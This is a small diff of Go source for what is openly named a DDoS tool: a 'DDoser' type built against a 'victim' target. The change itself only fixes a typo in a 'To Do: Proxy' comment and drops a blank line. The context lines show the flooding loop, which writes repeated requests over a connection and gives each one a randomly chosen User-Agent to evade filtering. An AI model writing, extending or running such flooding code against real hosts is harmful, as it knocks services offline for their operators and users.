@@ -47,10 +47,9 @@ func NewDDoser(method, victim string) (*DDoser, error) {
 	return &DDoser{conn, req}, nil
 }
 
-// To Do: Porxy
+// To Do: Proxy
 func (d *DDoser) Do(userAgents []string, n int) {
 	defer d.Conn.Close()
-
 	for i := 0; i < n; i++ {
 		d.Request.Header.Set("User-Agent", random(userAgents))
 		d.Request.Write(d.Conn)
